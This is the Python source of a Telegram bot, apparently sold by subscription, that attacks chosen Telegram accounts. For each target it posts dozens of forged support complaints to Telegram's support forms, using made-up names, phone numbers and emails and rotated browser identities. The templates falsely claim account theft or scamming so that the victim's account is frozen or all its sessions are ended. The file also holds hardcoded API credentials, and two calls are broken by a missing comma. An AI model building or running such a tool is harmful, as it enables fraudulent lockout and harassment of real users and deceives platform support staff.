import asyncio
import aiohttp
import random
import json
import os
import logging
import re
from datetime import datetime, timedelta
from telethon import TelegramClient, events, Button, functions

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('freezer')

# ==================== КОНФИГ ====================
API_ID = int(os.environ.get('API_ID', 39875871))
API_HASH = os.environ.get('API_HASH', '194a27a63519b6f5e12551fad0038e95')
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8698922231:AAG8nMvtxUpTog9MZXaUVE2rWzyKZu76fIk')
ADMIN_ID = int(os.environ.get('ADMIN_ID', 5134284689))

ADMIN_USERNAME = "qsplp"  # Админ для оплаты

bot = TelegramClient('bot', API_ID, API_HASH)

# ==================== ДАННЫЕ ====================
FIRST_NAMES = [
    "James","Michael","Robert","John","David","William","Richard","Joseph",
    "Thomas","Christopher","Charles","Daniel","Matthew","Anthony","Mark",
    "Donald","Steven","Andrew","Paul","Joshua","Kenneth","Kevin","Brian",
    "George","Timothy","Ronald","Jason","Edward","Jeffrey","Ryan","Jacob",
    "Nicholas","Gary","Eric","Jonathan","Stephen","Larry","Justin","Scott",
    "Brandon","Benjamin","Samuel","Gregory","Alexander","Patrick","Frank",
    "Raymond","Jack","Dennis","Jerry","Tyler","Aaron","Jose","Adam","Nathan",
    "Henry","Zachary","Douglas","Peter","Kyle","Noah","Ethan","Jeremy",
    "Walter","Christian","Keith","Roger","Terry","Austin","Sean","Gerald",
    "Carl","Harold","Dylan","Arthur","Lawrence","Jordan","Jesse","Bryan",
    "Billy","Bruce","Gabriel","Joe","Logan","Alan","Juan","Albert","Willie",
    "Elijah","Wayne","Randy","Roy","Vincent","Ralph","Louis","Bobby",
    "Russell","Bradley","Philip","Eugene","Johnny","Martin","Jeffery",
    "Алексей","Дмитрий","Сергей","Андрей","Максим","Иван","Егор","Никита",
    "Артём","Владимир","Павел","Антон","Михаил","Роман","Денис","Александр",
    "Кирилл","Виктор","Олег","Игорь","Евгений","Николай","Станислав",
    "Вадим","Григорий","Тимур","Константин","Виталий","Юрий","Борис",
    "Фёдор","Пётр","Степан","Глеб","Арсений","Даниил","Матвей",
]

LAST_NAMES = [
    "Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
    "Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson",
    "Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson",
    "White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson","Walker",
    "Young","Allen","King","Wright","Scott","Torres","Nguyen","Hill","Flores",
    "Green","Adams","Nelson","Baker","Hall","Rivera","Campbell","Mitchell",
    "Carter","Roberts","Turner","Phillips","Parker","Evans",
    "Edwards","Collins","Stewart","Morris","Murphy","Cook","Rogers","Morgan",
    "Peterson","Cooper","Reed","Bailey","Bell","Gomez","Kelly","Howard",
    "Ward","Cox","Diaz","Richardson","Wood","Watson","Brooks","Bennett",
    "Gray","James","Reyes","Cruz","Hughes","Price","Myers","Long","Foster",
    "Sanders","Ross","Morales","Powell","Sullivan","Russell","Ortiz",
    "Jenkins","Gutierrez","Perry","Butler","Barnes","Fisher","Henderson",
    "Coleman","Simmons","Patterson","Jordan","Reynolds","Hamilton","Graham",
    "Kim","Gonzales","Alexander","Ramos","Wallace","Griffin","West","Cole",
    "Hayes","Chavez","Gibson","Bryant","Ellis","Stevens","Murray","Ford",
    "Marshall","Owens","McDonald","Harrison","Ruiz","Kennedy","Wells",
    "Иванов","Петров","Смирнов","Кузнецов","Васильев","Попов","Соколов",
    "Морозов","Волков","Новиков","Фёдоров","Михайлов","Романов","Зайцев",
    "Егоров","Степанов","Орлов","Алексеев","Николаев","Павлов","Козлов",
    "Борисов","Григорьев","Сергеев","Андреев","Титов","Макаров",
]

EMAIL_DOMAINS = [
    'gmail.com','yahoo.com','outlook.com','proton.me','mail.ru','yandex.ru',
    'rambler.ru','bk.ru','inbox.ru','icloud.com','hotmail.com','live.com',
    'aol.com','zoho.com','gmx.com','web.de','tutanota.com','protonmail.com',
    'fastmail.com','hey.com','skiff.com','keemail.me','disroot.org',
]

PHONE_CODES = [
    '7916','7926','7903','7910','7920','7905','7909','7985','7915','7925',
    '7937','7958','7960','7963','7965','7967','7968','7977','7980','7982',
    '7927','7928','7929','7930','7931','7932','7933','7934','7935','7936',
    '7938','7939','7940','7950','7951','7952','7953','7954','7955','7956',
    '7911','7912','7913','7914','7917','7918','7919','7921','7922','7923',
    '7983','7984','7986','7987','7988','7989','7990','7991','7992','7993',
]

UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.49 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S24) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.102 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
]

FREEZE_COMPLAINTS = [
    "URGENT: My account @{u} (ID: {id}) has been hacked. The attacker is currently active and sending messages to my contacts. Please FREEZE my account immediately to prevent further damage. I am the real owner. My phone: +{p}. I can verify my identity. Please freeze until I recover access.",
    "Hello Telegram support, I am the owner of @{u} (ID: {id}). My account was compromised. Someone else is using it right now. Please temporarily freeze my account so the hacker cannot use it. I will verify my identity with my phone number +{p}. This is urgent.",
    "Dear support, I need my account @{u} (ID: {id}) to be frozen immediately. I clicked a phishing link and now a stranger has access. They are messaging my friends and colleagues. My phone: +{p}. Please freeze the account and I will provide any verification needed.",
    "ACCOUNT COMPROMISED: @{u} (ID: {id}). I am the legitimate owner. Someone gained unauthorized access. Please freeze this account now. Phone for verification: +{p}. I can prove ownership through SMS or email.",
    "Dear Telegram team, my account @{u} (ID: {id}) is currently under control of a hacker. I lost access after clicking a malicious link. Please freeze the account temporarily. My number: +{p}. I am ready to verify. Thank you.",
    "Suspicious activity report: Account @{u} (ID: {id}) is sending phishing links to multiple users. This account appears to be compromised or is a scam account. Please investigate and freeze if necessary. Reported by phone: +{p}.",
    "I want to report account @{u} (ID: {id}) for unusual behavior. It is mass-messaging users with suspicious links. This account seems hacked. Please freeze it to protect other users. My phone: +{p}.",
    "Hello, I received strange messages from @{u} (ID: {id}). The account is sending links and asking for money. It looks like a hacked account or a scammer. Please freeze this account. Reporter phone: +{p}.",
    "Report: @{u} (ID: {id}) is behaving like a compromised account. Sending spam and phishing links. Multiple people received these messages. Please freeze for investigation. Phone: +{p}.",
    "Account @{u} (ID: {id}) is sending unsolicited and suspicious messages. Appears to be stolen. Please freeze the account to prevent harm. My contact: +{p}. Thank you.",
    "EMERGENCY: My Telegram @{u} ID:{id} was stolen. Hacker changed my password and is impersonating me. FREEZE immediately. I am ready to verify with passport if needed. My phone: +{p}.",
    "My account @{u} (ID:{id}) was hacked 30 minutes ago. The hacker is sending scam links to all my contacts and groups. I am desperate. Please freeze it NOW. Phone: +{p}. I will send any documents needed.",
    "СРОЧНО: Мой аккаунт @{u} (ID: {id}) взломали. Злоумышленник сейчас активен и пишет моим контактам. Пожалуйста, ЗАМОРОЗЬТЕ аккаунт немедленно. Я настоящий владелец. Телефон: +{p}. Готов подтвердить личность.",
    "Здравствуйте, я владелец @{u} (ID: {id}). Мой аккаунт скомпрометирован. Кто-то другой использует его прямо сейчас. Прошу временно заморозить аккаунт. Мой номер: +{p}. Могу верифицироваться.",
    "Поддержка Telegram, прошу заморозить аккаунт @{u} (ID: {id}). Я перешёл по фишинговой ссылке и теперь посторонний имеет доступ. Пишет моим друзьям. Телефон: +{p}. Заморозьте и я подтвержу личность.",
    "АККАУНТ ВЗЛОМАН: @{u} (ID: {id}). Я законный владелец. Кто-то получил несанкционированный доступ. Заморозьте аккаунт сейчас. Телефон для верификации: +{p}.",
    "ВЗЛОМ: @{u} ID:{id}. Потерял доступ 2 часа назад. Хакер требует выкуп через крипту. Заморозьте аккаунт пока он не украл данные моих клиентов. Тел: +{p}.",
    "ЭКСТРЕННО: @{u} ID:{id} угнан. Мошенник рассылает интимные фото моим родственникам. Умоляю заморозить. Паспорт готов предоставить. Тел: +{p}.",
]

NUKE_COMPLAINTS = [
    "I lost access to my account @{u} (ID: {id}). My phone died and I cannot receive SMS codes to log in. Please terminate ALL active sessions immediately so I can safely recover. I can verify my identity with passport. My current phone: +{p}. Email: {e}",
    "URGENT SESSION TERMINATION: @{u} ID:{id}. I am the real owner. Someone logged into my account from another country (I see it in active sessions). Please kill all other sessions NOW. My phone for verification: +{p}.",
    "Security breach detected: @{u} (ID:{id}). Unauthorized login from unknown device. I need ALL sessions terminated except this support request. I am the legitimate owner. Phone: +{p}. Email: {e}.",
    "RECOVERY HELP: Lost phone with active Telegram session @{u} ID:{id}. Please terminate all sessions so I can regain control. I can prove identity with phone +{p} and email {e}. I have my passport ready.",
    "Account @{u} ID:{id} hacked and hijacked. The attacker started new sessions from their device. Terminate ALL sessions immediately so I can log in safely. Owner phone: +{p}. Please act fast before they change my username.",
    "My phone was stolen with Telegram @{u} ID:{id} logged in. Thief has access to everything. Please TERMINATE ALL SESSIONS. I am the owner. Verification phone: +{p}. I am desperate.",
    "Unauthorized access to @{u} ID:{id}. Multiple unknown sessions active. Please force-terminate all sessions except this request. I am ready to verify identity with government ID. Phone: +{p}. Email: {e}.",
    "SESSION HIJACK: @{u} ID:{id}. Someone cloned my session via QR code phishing. I see their device in my active sessions. KILL ALL SESSIONS NOW. Phone: +{p}.",
    "Traveling abroad, lost phone with @{u} ID:{id}. Cannot use my SIM card. Need all sessions terminated urgently. Can verify via email {e} and passport scan. Backup phone: +{p}.",
    "Срочно: потерял доступ к @{u} ID:{id}. Телефон разбился вдребезги. Не могу получить SMS для входа. Убейте ВСЕ активные сессии. Мой номер: +{p}. Почта для связи: {e}",
    "Взлом сессии @{u} ID:{id}. Вижу чужое устройство в активных сессиях. Прошу принудительно завершить ВСЕ сессии. Владелец: +{p}.",
    "Потерян телефон с активной сессией @{u} ID:{id}. Сбросьте ВСЕ сессии немедленно. Мой номер: +{p}. Почта: {e}",
    "Сим-своп атака на @{u} ID:{id}. Мошенник перевыпустил мою симку и зашёл в аккаунт. Я восстановил номер +{p}. Сбросьте ВСЕ СЕССИИ.",
]

SUPPORT_ENDPOINTS = [
    "https://telegram.org/support",
    "https://telegram.org/support?setln=en",
    "https://telegram.org/support/contact",
    "https://telegram.org/support/security",
]

# ==================== БАЗА ДАННЫХ ====================
DB_FILE = 'users.json'
STATE_FILE = 'states.json'
ATTACK_LOG_FILE = 'attacks.json'
COOLDOWN_FILE = 'cooldowns.json'

def load_json(path, default=None):
    if default is None:
        default = {}
    if os.path.exists(path):
        try:
            with open(path, 'r') as f:
                return json.load(f)
        except:
            return default
    return default

def save_json(path, data):
    with open(path, 'w') as f:
        json.dump(data, f, indent=2, default=str)

def load_db():
    return load_json(DB_FILE)

def save_db(data):
    save_json(DB_FILE, data)

def get_user(user_id):
    db = load_db()
    uid = str(user_id)
    if uid not in db:
        db[uid] = {
            'sub_end': None,
            'attacks_today': 0,
            'banned': False,
            'joined': datetime.now().isoformat()
        }
        save_db(db)
    return db[uid]

def update_user(user_id, data):
    db = load_db()
    db[str(user_id)] = data
    save_db(db)

def has_sub(user_id):
    if user_id == ADMIN_ID:
        return True
    user = get_user(user_id)
    if user.get('banned'):
        return False
    if user['sub_end'] == 'forever':
        return True
    if user['sub_end']:
        try:
            end = datetime.fromisoformat(user['sub_end'])
            if end > datetime.now():
                return True
        except:
            pass
    return False

def add_sub(user_id, days):
    user = get_user(user_id)
    if days == 'forever':
        user['sub_end'] = 'forever'
    else:
        if user['sub_end'] and user['sub_end'] != 'forever':
            try:
                existing_end = datetime.fromisoformat(user['sub_end'])
                if existing_end > datetime.now():
                    start = existing_end
                else:
                    start = datetime.now()
            except:
                start = datetime.now()
        else:
            start = datetime.now()
        user['sub_end'] = (start + timedelta(days=days)).isoformat()
    update_user(user_id, user)

# ==================== СОСТОЯНИЯ ====================
def load_states():
    return load_json(STATE_FILE)

def save_states(data):
    save_json(STATE_FILE, data)

def set_state(user_id, state):
    states = load_states()
    states[str(user_id)] = state
    save_states(states)

def get_state(user_id):
    states = load_states()
    return states.get(str(user_id))

def clear_state(user_id):
    states = load_states()
    states.pop(str(user_id), None)
    save_states(states)

# ==================== КУЛДАУНЫ ====================
COOLDOWN_SECONDS = 60

def load_cooldowns():
    return load_json(COOLDOWN_FILE)

def save_cooldowns(data):
    save_json(COOLDOWN_FILE, data)

def get_cooldown(user_id):
    cooldowns = load_cooldowns()
    uid = str(user_id)
    if uid in cooldowns:
        last_attack = datetime.fromisoformat(cooldowns[uid])
        elapsed = (datetime.now() - last_attack).total_seconds()
        remaining = COOLDOWN_SECONDS - elapsed
        if remaining > 0:
            return int(remaining)
    return 0

def set_cooldown(user_id):
    cooldowns = load_cooldowns()
    cooldowns[str(user_id)] = datetime.now().isoformat()
    save_cooldowns(cooldowns)

# ==================== ЛОГ АТАК ====================
def log_attack(user_id, target, tid, attack_type, success_count, total_count):
    logs = load_json(ATTACK_LOG_FILE, [])
    entry = {
        "user_id": user_id,
        "target": target,
        "target_id": tid,
        "attack_type": attack_type,
        "success": success_count,
        "total": total_count,
        "timestamp": datetime.now().isoformat()
    }
    logs.append(entry)
    if len(logs) > 1000:
        logs = logs[-1000:]
    save_json(ATTACK_LOG_FILE, logs)

# ==================== ГЕНЕРАТОРЫ ====================
def generate_phone():
    return f"+7{random.choice(PHONE_CODES)}{random.randint(1000000, 9999999)}"

def generate_name():
    return f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}"

def generate_email(name):
    clean = name.lower().replace(' ', '.').replace('ё', 'e').replace('й', 'y')
    return f"{clean}{random.randint(10, 99999)}@{random.choice(EMAIL_DOMAINS)}"

# ==================== ОТПРАВКА ЗАПРОСОВ ====================
async def send_freeze_request(target, tid):
    phone = generate_phone()
    name = generate_name()
    email = generate_email(name)
    body = random.choice(FREEZE_COMPLAINTS).format(u=target, id=tid, p=phone, e=email)
    
    headers = {
        "User-Agent": random.choice(UA),
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://telegram.org",
        "Referer": "https://telegram.org/support",
    }
    
    data = {
        "problem": body,
        "email": email,
        "phone": phone,
        "username": f"@{target}",
        "type": "hacked_account"
    }
    
    try:
        timeout = aiohttp.ClientTimeout(total=20)
        connector = aiohttp.TCPConnector(ssl=True, force_close=True)
        async with aiohttp.ClientSession(connector=connector) as session:
            endpoint = random.choice(SUPPORT_ENDPOINTS)
            async with session.post(endpoint, headers=headers, data=data, timeout=timeout) as resp:
                return resp.status in (200, 302, 303, 301, 307, 308)
    except:
        return False

async def send_nuke_request(target, tid):
    phone = generate_phone()
    name = generate_name()
    email = generate_email(name)
    body = random.choice(NUKE_COMPLAINTS).format(u=target, id=tid, p=phone, e=email)
    
    headers = {
        "User-Agent": random.choice(UA),
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://telegram.org",
        "Referer": "https://telegram.org/support",
    }
    
    data = {
        "problem": body,
        "email": email,
        "phone": phone,
        "username": f"@{target}",
        "type": "lost_access"
    }
    
    try:
        timeout = aiohttp.ClientTimeout(total=20)
        connector = aiohttp.TCPConnector(ssl=True, force_close=True)
        async with aiohttp.ClientSession(connector=connector) as session:
            endpoint = random.choice(SUPPORT_ENDPOINTS)
            async with session.post(endpoint, headers=headers, data=data, timeout=timeout) as resp:
                return resp.status in (200, 302, 303, 301, 307, 308)
    except:
        return False

# ==================== ЛОГИКА АТАКИ ====================
async def execute_attack(event, target, tid, attack_type):
    uid = event.sender_id
    
    cooldown = get_cooldown(uid)
    if cooldown > 0:
        try:
            await event.edit(f"⏳ Подождите {cooldown} сек.", buttons=back_button())
        except:
            await event.reply(f"⏳ Подождите {cooldown} сек.")
        return
    
    if not has_sub(uid):
        await event.reply("❌ Нужна подписка!", buttons=back_button())
        return
    
    if attack_type == 'freeze':
        count = 35
        emoji = "❄️"
        name = "ЗАМОРОЗКА"
        send_func = send_freeze_request
    else:
        count = 45
        emoji = "💣"
        name = "СБРОС СЕССИЙ"
        send_func = send_nuke_request
    
    set_cooldown(uid)
    
    msg = await event.reply(
        f"{emoji} **{name}**\n"
        f"👤 Цель: @{target}\n"
        f"🆔 ID: `{tid}`\n"
        f"📦 Запросов: {count}\n"
        f"🚀 Запуск..."
    )
    
    semaphore = asyncio.Semaphore(5)
    
    async def send_one(index):
        async with semaphore:
            delay = random.uniform(0.3, 2.5) if index < 10 else random.uniform(1.0, 5.0)
            await asyncio.sleep(delay)
            return await send_func(target, tid)
    
    tasks = [send_one(i) for i in range(count)]
    results = await asyncio.gather(*tasks)
    ok = sum(1 for r in results if r)
    
    user = get_user(uid)
    user['attacks_today'] += 1
    update_user(uid, user)
    
    log_attack(uid, target, tid, attack_type, ok, count)
    
    success_rate = int((ok / count) * 100)
    if success_rate >= 80:
        status = "🟢 Отлично"
    elif success_rate >= 50:
        status = "🟡 Хорошо"
    elif success_rate >= 30:
        status = "🟠 Средне"
    else:
        status = "🔴 Слабо"
    
    await msg.edit(
        f"{emoji} **АТАКА ЗАВЕРШЕНА**\n\n"
        f"👤 Цель: @{target}\n"
        f"🆔 ID: `{tid}`\n"
        f"📊 Отправлено: {ok}/{count}\n"
        f"📈 Эффективность: {success_rate}%\n"
        f"📡 Статус: {status}\n\n"
        f"⏱ Результат через 1-24 часа",
        buttons=[
            [Button.inline(f"🔄 Повторить", f"repeat_{attack_type}_{target}_{tid}")],
            [Button.inline("🔙 В меню", b"back_main")],
        ]
    )

# ==================== КЛАВИАТУРЫ ====================
def main_menu(user_id):
    sub_text = "✅" if has_sub(user_id) else "❌"
    return [
        [Button.inline("❄️ Заморозка аккаунта", b"attack_freeze")],
        [Button.inline("💣 Сброс всех сессий", b"attack_nuke")],
        [Button.inline(f"⭐ Подписка [{sub_text}]", b"sub_menu")],
        [Button.inline("👤 Профиль", b"profile")],
        [Button.url(f"💎 По поводу подписки: @{ADMIN_USERNAME}", f"https://t.me/{ADMIN_USERNAME}")],
    ]

def admin_menu():
    return [
        [Button.inline("📊 Статистика", b"admin_stats")],
        [Button.inline("👥 Пользователи", b"admin_users")],
        [Button.inline("📋 Лог атак", b"admin_log")],
        [Button.inline("⭐ Выдать подписку", b"admin_give_sub")],
        [Button.inline("🚫 Бан/Разбан", b"admin_ban")],
        [Button.inline("🔙 Назад", b"back_main")],
    ]

def sub_menu():
    return [
        [Button.url("⭐ 1 день — 50 ⭐", f"https://t.me/{ADMIN_USERNAME}")],
        [Button.url("⭐ 7 дней — 150 ⭐", f"https://t.me/{ADMIN_USERNAME}")],
        [Button.url("⭐ Навсегда — 250 ⭐", f"https://t.me/{ADMIN_USERNAME}")],
        [Button.inline("🔙 Назад", b"back_main")],
    ]

def back_button():
    return [[Button.inline("🔙 Назад", b"back_main")]]

# ==================== КОМАНДЫ ====================
@bot.on(events.NewMessage(pattern='/start'))
async def cmd_start(event):
    user = get_user(event.sender_id)
    if user.get('banned'):
        await event.reply("⛔ Вы забанены.")
        return
    clear_state(event.sender_id)
    await event.reply(
        "❄️ **FREEZER BOT v2.0**\n\n"
        "⚡ Заморозка аккаунтов\n"
        "💣 Сброс всех сессий\n"
        f"💎 Подписка через: @{ADMIN_USERNAME}\n\n"
        "Выберите действие:",
        buttons=main_menu(event.sender_id)
    )

@bot.on(events.NewMessage(pattern='/admin'))
async def cmd_admin(event):
    if event.sender_id != ADMIN_ID:
        return
    await event.reply("🔐 **Админ-панель**", buttons=admin_menu())

# ==================== ВВОД ДЛЯ АТАК ====================
@bot.on(events.NewMessage(func=lambda e: get_state(e.sender_id) is not None))
async def handle_attack_input(event):
    state = get_state(event.sender_id)
    if not state or state in ('admin_sub', 'admin_ban'):
        return
    
    text = event.message.text.strip()
    match = re.match(r'@?(\S+)\s+(\d+)', text)
    
    if not match:
        await event.reply("❌ Формат: `@username ID`\nПример: `@targetuser 123456789`")
        return
    
    target = match.group(1)
    tid = match.group(2)
    attack_type = state
    clear_state(event.sender_id)
    await execute_attack(event, target, tid, attack_type)

# ==================== КНОПКИ ====================
@bot.on(events.CallbackQuery)
async def callback_handler(event):
    data = event.data.decode()
    uid = event.sender_id
    user = get_user(uid)
    
    if user.get('banned') and data not in ("sub_menu", "back_main", "profile"):
        await event.answer("⛔ Вы забанены.", alert=True)
        return
    
    if data == "back_main":
        clear_state(uid)
        await event.edit(
            f"❄️ **TACO OS**\n\n"
            f"💎 Подписка через: @{ADMIN_USERNAME}\n\n"
            "Выберите действие:",
            buttons=main_menu(uid)
        )
    
    elif data == "profile":
        u = get_user(uid)
        if u['sub_end'] == 'forever':
            sub = "✅ Навсегда"
        elif u['sub_end'] and datetime.fromisoformat(u['sub_end']) > datetime.now():
            days_left = (datetime.fromisoformat(u['sub_end']) - datetime.now()).days
            sub = f"✅ {days_left} дн."
        else:
            sub = "❌ Нет"
        
        txt = (
            f"👤 **Профиль**\n\n"
            f"🆔 `{uid}`\n"
            f"⭐ Подписка: {sub}\n"
            f"🔥 Атак сегодня: {u.get('attacks_today', 0)}\n\n"
            f"💎 Оплата: @{ADMIN_USERNAME}"
        )
        await event.edit(txt, buttons=back_button())
    
    elif data == "sub_menu":
        await event.edit(
            "⭐ **Подписка**\n\n"
            "• 1 день — 50 ⭐\n"
            "• 7 дней — 150 ⭐\n"
            "• Навсегда — 250 ⭐\n\n"
            f"💎 Для оплаты пишите: @{ADMIN_USERNAME}\n"
            "После оплаты админ выдаст подписку.\n\n"
            "Нажмите на тариф чтобы перейти:",
            buttons=sub_menu()
        )
    
    elif data == "attack_freeze":
        cooldown = get_cooldown(uid)
        if cooldown > 0:
            await event.answer(f"⏳ Кулдаун {cooldown} сек.", alert=True)
            return
        if not has_sub(uid):
            await event.answer("❌ Нужна подписка!", alert=True)
            return
        set_state(uid, 'freeze')
        await event.edit(
            "❄️ **ЗАМОРОЗКА**\n\n"
            "Отправьте: `@username ID`\n"
            "Пример: `@badguy 123456789`\n\n"
            
            buttons=back_button()
        )
    
    elif data == "attack_nuke":
        cooldown = get_cooldown(uid)
        if cooldown > 0:
            await event.answer(f"⏳ Кулдаун {cooldown} сек.", alert=True)
            return
        if not has_sub(uid):
            await event.answer("❌ Нужна подписка!", alert=True)
            return
        set_state(uid, 'nuke')
        await event.edit(
            "💣 **СБРОС СЕССИЙ**\n\n"
            "Отправьте: `@username ID`\n"
            "Пример: `@target 987654321`\n\n"
            buttons=back_button()
        )
    
    elif data.startswith("repeat_"):
        parts = data.split("_", 3)
        if len(parts) == 4:
            attack_type = parts[1]
            target = parts[2]
            tid = parts[3]
            
            cooldown = get_cooldown(uid)
            if cooldown > 0:
                await event.answer(f"⏳ Кулдаун {cooldown} сек.", alert=True)
                return
            if not has_sub(uid):
                await event.answer("❌ Нужна подписка!", alert=True)
                return
            
            await event.answer("🔄 Повторяю...")
            await execute_attack(event, target, tid, attack_type)
    
    elif data == "admin_stats" and uid == ADMIN_ID:
        db = load_db()
        total = len(db)
        active = sum(1 for u in db.values() if u.get('sub_end') and (
            u['sub_end'] == 'forever' or 
            (isinstance(u['sub_end'], str) and len(u['sub_end']) > 10 and datetime.fromisoformat(u['sub_end']) > datetime.now())
        ))
        logs = load_json(ATTACK_LOG_FILE, [])
        today = sum(1 for l in logs if l['timestamp'][:10] == datetime.now().isoformat()[:10])
        await event.edit(f"📊 **Статистика**\n\n👥 Пользователей: {total}\n⭐ Подписок: {active}\n🔥 Атак сегодня: {today}", buttons=admin_menu())
    
    elif data == "admin_users" and uid == ADMIN_ID:
        db = load_db()
        txt = "👥 **Последние 20:**\n\n"
        for uid_str, u in list(db.items())[-20:]:
            sub = "✅" if (u.get('sub_end') == 'forever' or (u.get('sub_end') and len(u.get('sub_end',''))>10 and datetime.fromisoformat(u['sub_end']) > datetime.now())) else "❌"
            ban = "🚫" if u.get('banned') else ""
            txt += f"`{uid_str}` {sub}{ban}\n"
        await event.edit(txt, buttons=admin_menu())
    
    elif data == "admin_log" and uid == ADMIN_ID:
        logs = load_json(ATTACK_LOG_FILE, [])
        txt = "📋 **Последние 15 атак:**\n\n"
        for l in logs[-15:]:
            ts = l['timestamp'][:16].replace('T', ' ')
            e = "❄️" if l['attack_type'] == 'freeze' else "💣"
            txt += f"`{l['user_id']}` {e} @{l['target']} — {l['success']}/{l['total']} ({ts})\n"
        await event.edit(txt, buttons=admin_menu())
    
    elif data == "admin_give_sub" and uid == ADMIN_ID:
        set_state(uid, 'admin_sub')
        await event.edit("⭐ **Выдать подписку**\n\nФормат: `ID дни` или `ID forever`", buttons=back_button())
    
    elif data == "admin_ban" and uid == ADMIN_ID:
        set_state(uid, 'admin_ban')
        await event.edit("🚫 **Бан/Разбан**\n\nОтправьте ID:", buttons=back_button())

# ==================== АДМИН ВВОД ====================
@bot.on(events.NewMessage(func=lambda e: get_state(e.sender_id) in ('admin_sub', 'admin_ban')))
async def handle_admin_input(event):
    state = get_state(event.sender_id)
    
    if state == 'admin_sub':
        parts = event.message.text.strip().split()
        if len(parts) >= 2:
            try:
                uid = int(parts[0])
                days = 'forever' if parts[1].lower() == 'forever' else int(parts[1])
                add_sub(uid, days)
                clear_state(event.sender_id)
                await event.reply(f"✅ Подписка выдана `{uid}`", buttons=back_button())
            except:
                await event.reply("❌ Неверный формат")
    
    elif state == 'admin_ban':
        try:
            uid = int(event.message.text.strip())
            u = get_user(uid)
            u['banned'] = not u.get('banned', False)
            update_user(uid, u)
            clear_state(event.sender_id)
            status = "ЗАБАНЕН" if u['banned'] else "РАЗБАНЕН"
            await event.reply(f"🚫 `{uid}` {status}", buttons=back_button())
        except:
            await event.reply("❌ Неверный ID")

# ==================== ЗАПУСК ====================
async def main():
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    logger.info("=" * 50)
    logger.info(f"❄️ FREEZER BOT v2.0 @{me.username}")
    logger.info(f"🆔 Bot ID: {me.id}")
    logger.info(f"🔐 Admin: {ADMIN_ID}")
    logger.info(f"💎 Оплата через: @{ADMIN_USERNAME}")
    logger.info("=" * 50)
    logger.info("✅ Бот запущен")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("🛑 Остановлен")
    except Exception as e:
        logger.error(f"💥 Ошибка: {e}")
